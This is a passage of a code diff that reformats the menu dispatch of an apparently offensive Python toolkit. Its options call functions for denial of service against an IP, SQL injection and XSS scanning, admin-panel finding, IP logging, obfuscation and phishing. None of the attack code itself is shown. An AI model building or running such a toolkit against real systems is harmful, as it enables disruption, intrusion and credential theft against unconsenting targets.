+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter number of threads: {Color.RESET}"))
         dos_ip(ip_address, duration, threads)
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '18':
-        url = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the URL to check for redirects: {Color.RESET}")
+        url = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the URL to check for redirects: {Color.RESET}")
         check_url(url)
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '19':
-        url = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the URL to scan for XSS: {Color.RESET}")
+        url = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the URL to scan for XSS: {Color.RESET}")
         xss_scan()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '20':
-        mac_address = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the MAC address to search: {Color.RESET}")
+        mac_address = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the MAC address to search: {Color.RESET}")
         search_mac_address(mac_address)
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == 'COLOR':
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Select Color Scheme: ")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 1 - Green")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 2 - Blue")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 3 - Purple")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 4 - Yellow")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 5 - Cyan")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 6 - Grayscale")
-        scheme_choice = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Your choice: ")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Select Color Scheme: ")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 1 - Green")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 2 - Blue")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 3 - Purple")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 4 - Yellow")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 5 - Cyan")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 6 - Grayscale")
+        scheme_choice = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Your choice: ")
         if scheme_choice == '1':
             change_color_scheme('green')
         elif scheme_choice == '2':
@@ -1732,38 +1992,47 @@ COLOR - Changing the software theme
             change_color_scheme('cyan')
         elif scheme_choice == '6':
             change_color_scheme('grayscale')
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Color scheme updated.")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Color scheme updated.")
     elif select == '21':
         find_admin_panel()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '22':
         payload_type = input(
             f"{Color.LIGHT_BLUE}Enter payload type (scan/injection): {Color.RESET}").strip().lower()
         if payload_type not in ['scan', 'injection']:
-            print(f"{Color.RED}Invalid payload type! Choose from 'scan' or 'injection'.{Color.RESET}")
+            print(
+                f"{Color.RED}Invalid payload type! Choose from 'scan' or 'injection'.{Color.RESET}")
         payload_type += '_payload'
         try:
             sql_injection_scanner(payload_type)
         except Exception as e:
-            print(f"{Color.RED}An error occurred during the SQL injection scan: {e}{Color.RESET}")
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Press Enter...")
+            print(
+                f"{Color.RED}An error occurred during the SQL injection scan: {e}{Color.RESET}")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Press Enter...")
     elif select == '23':
         find_subdomains()
     elif select == '24':
         logger_ip()
     elif select == '25':
         google_osint()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '26':
         telegram_search()
     elif select == '27':
         check_username()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '28':
         obfuscate_tool()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '29':
-            web_crawler()
-            input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        web_crawler()
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '30':
         phishing()
